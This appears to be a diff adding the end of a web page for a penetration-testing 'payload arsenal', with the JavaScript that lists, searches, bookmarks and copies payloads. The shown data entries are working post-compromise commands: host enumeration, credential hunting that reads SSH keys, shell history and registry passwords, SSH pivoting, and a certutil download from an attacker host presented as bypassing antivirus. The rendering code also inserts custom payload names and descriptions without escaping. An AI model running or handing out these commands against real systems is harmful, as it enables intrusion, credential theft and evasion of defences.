+  { id:'lx1', cat:'linux', os:'linux', name:'System Enumeration', desc:'Quick situational awareness commands on a new Linux foothold.',
+    code:`whoami && id
+hostname && uname -a
+cat /etc/os-release
+ip a; ip route
+cat /etc/hosts
+ps aux | grep root
+netstat -tulnp 2>/dev/null || ss -tulnp` },
+  { id:'lx2', cat:'linux', os:'linux', name:'File Search', desc:'Find interesting files — credentials, configs, backups, writable paths.',
+    code:`find / -name "*.conf" 2>/dev/null
+find / -name "id_rsa*" 2>/dev/null
+find / -writable -type f 2>/dev/null | grep -v proc
+find / -name "*.bak" -o -name "*.old" 2>/dev/null
+cat ~/.bash_history
+cat ~/.ssh/id_rsa 2>/dev/null` },
+  { id:'lx3', cat:'linux', os:'linux', name:'Port Forwarding (SSH)', desc:'Forward local port to a remote service via SSH tunnel. Useful for pivoting.',
+    code:`# Local port forwarding (access remote service locally):
+ssh -L LOCAL_PORT:TARGET_HOST:TARGET_PORT user@SSH_SERVER
+
+# Dynamic SOCKS proxy (use with proxychains):
+ssh -D 1080 user@SSH_SERVER
+
+# Remote port forwarding (expose local port on remote):
+ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@SSH_SERVER` },
+
+  // ── WINDOWS COMMANDS ──
+  { id:'w1', cat:'windows', os:'windows', name:'System Enumeration', desc:'Initial situational awareness on a Windows foothold.',
+    code:`whoami /all
+systeminfo
+ipconfig /all
+netstat -ano
+tasklist /v
+net user
+net localgroup administrators
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` },
+  { id:'w2', cat:'windows', os:'windows', name:'Credential Hunting', desc:'Common locations for stored credentials on Windows systems.',
+    code:`# Common config files:
+dir /s *pass* == *cred* == *vnc* == *.config 2>nul
+
+# Registry credentials:
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+
+# Unattend files:
+type C:\\Windows\\Panther\\Unattend.xml
+
+# PowerShell history:
+type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt` },
+  { id:'w3', cat:'windows', os:'windows', name:'Living Off the Land (LOLBins)', desc:'Use built-in Windows binaries for common pentest tasks — often bypasses AV.',
+    code:`# Download file with certutil:
+certutil -urlcache -split -f http://ATTACKER/file.exe C:\\Windows\\Temp\\file.exe
+
+# Execute via rundll32:
+rundll32 javascript:"\..\mshtml,RunHTMLApplication ";...
+
+# Bypass script execution:
+powershell -ExecutionPolicy Bypass -File script.ps1
+powershell -EncodedCommand BASE64_COMMAND` },
+];
+
+let currentCat = 'all';
+let expandedIds = new Set();
+
+(async () => {
+  const user = await requireAuth();
+  if (!user) return;
+  document.getElementById('sb-username').textContent = user.email?.split('@')[0] || 'operator';
+  initMatrixRain('matrix', 0.07);
+  updateCounts();
+  renderPayloads();
+})();
+
+function allPayloads() {
+  return [...PAYLOADS, ...customPayloads.map(p => ({ ...p, id: 'c-'+p.id }))];
+}
+
+function updateCounts() {
+  const all = allPayloads();
+  const cats = ['xss','sqli','ssrf','ssti','xxe','lfi','csrf','revshell','privesc','activedir','linux','windows'];
+  cats.forEach(c => {
+    const el = document.getElementById('cnt-' + c);
+    if (el) el.textContent = all.filter(p => p.cat === c).length;
+  });
+  document.getElementById('cnt-all').textContent = all.length;
+  document.getElementById('cnt-bm').textContent = bookmarks.length;
+  document.getElementById('cnt-custom').textContent = customPayloads.length;
+  document.getElementById('tb-count').textContent = all.length;
+  document.getElementById('tb-bm').textContent = bookmarks.length;
+  document.getElementById('tb-custom').textContent = customPayloads.length;
+}
+
+function setCategory(cat, btn) {
+  currentCat = cat;
+  document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderPayloads();
+}
+
+function renderPayloads() {
+  const search = document.getElementById('search-input').value.toLowerCase();
+  const osFilter = document.getElementById('os-filter').value;
+  let items = allPayloads();
+
+  if (currentCat === 'bookmarks') items = items.filter(p => bookmarks.includes(p.id));
+  else if (currentCat === 'custom') items = items.filter(p => p.id.startsWith('c-'));
+  else if (currentCat !== 'all') items = items.filter(p => p.cat === currentCat);
+
+  if (osFilter) items = items.filter(p => p.os === osFilter);
+  if (search) items = items.filter(p =>
+    p.name.toLowerCase().includes(search) ||
+    p.desc.toLowerCase().includes(search) ||
+    p.code.toLowerCase().includes(search)
+  );
+
+  document.getElementById('result-count').textContent = items.length + ' results';
+
+  // Group by category
+  const grouped = {};
+  items.forEach(p => { (grouped[p.cat] = grouped[p.cat] || []).push(p); });
+
+  const catNames = {
+    xss:'XSS INJECTION', sqli:'SQL INJECTION', ssrf:'SSRF', ssti:'SSTI',
+    xxe:'XXE INJECTION', lfi:'LFI / PATH TRAVERSAL', csrf:'CSRF',
+    revshell:'REVERSE SHELLS', privesc:'PRIVILEGE ESCALATION',
+    activedir:'ACTIVE DIRECTORY', linux:'LINUX COMMANDS', windows:'WINDOWS COMMANDS', custom:'CUSTOM'
+  };
+
+  const list = document.getElementById('payload-list-inner');
+  if (!items.length) { list.innerHTML = '<div style="color:#1a5a1a;text-align:center;padding:30px;font-size:12px">No payloads match filters</div>'; return; }
+
+  const order = ['xss','sqli','ssrf','ssti','xxe','lfi','csrf','revshell','privesc','activedir','linux','windows','custom'];
+  list.innerHTML = order.filter(c => grouped[c]).map(c => {
+    const osCols = { linux:'os-linux', windows:'os-windows', web:'os-web', any:'os-any' };
+    return `<div class="section-header">
+        <span>${catNames[c] || c.toUpperCase()}</span>
+        <span style="color:#1a5a1a">${grouped[c].length} PAYLOADS</span>
+      </div>` +
+      grouped[c].map(p => {
+        const isBookmarked = bookmarks.includes(p.id);
+        const isExpanded = expandedIds.has(p.id);
+        return `<div class="payload-card ${isBookmarked ? 'bookmarked-card' : ''}" id="pc-${p.id}">
+          <div class="payload-header" onclick="toggleExpand('${p.id}')">
+            <span class="${osCols[p.os] || 'os-any'} os-tag">${p.os.toUpperCase()}</span>
+            <span class="payload-name">${p.name}</span>
+            <button class="bookmark-btn" onclick="event.stopPropagation();toggleBM('${p.id}')" title="Bookmark">${isBookmarked ? '⭐' : '☆'}</button>
+            <span style="font-size:11px;color:var(--green-dim)">${isExpanded ? '▲' : '▼'}</span>
+          </div>
+          <div class="payload-body ${isExpanded ? 'show' : ''}" id="pb-${p.id}">
+            <div class="payload-desc">${p.desc}</div>
+            <div class="payload-code" id="code-${p.id}">${escHTML(p.code)}</div>
+            <div class="payload-actions">
+              <button class="copy-btn" id="copybtn-${p.id}" onclick="copyPayload('${p.id}')">⎘ COPY</button>
+              <button class="copy-btn" onclick="copyPayload('${p.id}', true)">⎘ COPY RAW</button>
+              ${p.id.startsWith('c-') ? `<button class="copy-btn" style="color:var(--red);border-color:var(--red-dim)" onclick="deleteCustom('${p.id}')">✕ DELETE</button>` : ''}
+            </div>
+          </div>
+        </div>`;
+      }).join('');
+  }).join('');
+}
+
+function toggleExpand(id) {
+  if (expandedIds.has(id)) expandedIds.delete(id);
+  else expandedIds.add(id);
+  const body = document.getElementById('pb-' + id);
+  if (body) body.classList.toggle('show');
+  const card = document.getElementById('pc-' + id);
+  const arrow = card?.querySelector('.payload-header span:last-child');
+  if (arrow) arrow.textContent = expandedIds.has(id) ? '▲' : '▼';
+}
+
+function toggleBM(id) {
+  if (bookmarks.includes(id)) bookmarks = bookmarks.filter(b => b !== id);
+  else bookmarks.push(id);
+  localStorage.setItem('arsenal_bm', JSON.stringify(bookmarks));
+  updateCounts();
+  renderPayloads();
+}
+
+async function copyPayload(id, raw = false) {
+  const all = allPayloads();
+  const p = all.find(x => x.id === id || 'c-'+x.id === id);
+  if (!p) return;
+  await navigator.clipboard.writeText(p.code);
+  const btn = document.getElementById('copybtn-' + id);
+  if (btn) { btn.textContent = '✓ COPIED!'; btn.classList.add('copied'); setTimeout(() => { btn.textContent = '⎘ COPY'; btn.classList.remove('copied'); }, 1500); }
+}
+
+function showAddCustom() {
+  document.getElementById('add-custom-form').style.display = 'block';
+  document.getElementById('add-custom-form').scrollIntoView({ behavior:'smooth' });
+}
+
+function saveCustomPayload() {
+  const name = document.getElementById('cp-name').value.trim();
+  const code = document.getElementById('cp-code').value.trim();
+  if (!name || !code) return;
+  const cp = {
+    id: Date.now(),
+    cat: document.getElementById('cp-cat').value,
+    os: 'any',
+    name,
+    desc: document.getElementById('cp-desc').value.trim(),
+    code
+  };
+  customPayloads.push(cp);
+  localStorage.setItem('arsenal_custom', JSON.stringify(customPayloads));
+  ['cp-name','cp-desc','cp-code'].forEach(id => document.getElementById(id).value = '');
+  document.getElementById('add-custom-form').style.display = 'none';
+  updateCounts();
+  renderPayloads();
+}
+
+function deleteCustom(id) {
+  const rawId = id.replace('c-','');
+  customPayloads = customPayloads.filter(p => String(p.id) !== rawId);
+  localStorage.setItem('arsenal_custom', JSON.stringify(customPayloads));
+  updateCounts();
+  renderPayloads();
+}
+
+function escHTML(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+</script>
+</body>
+</html>
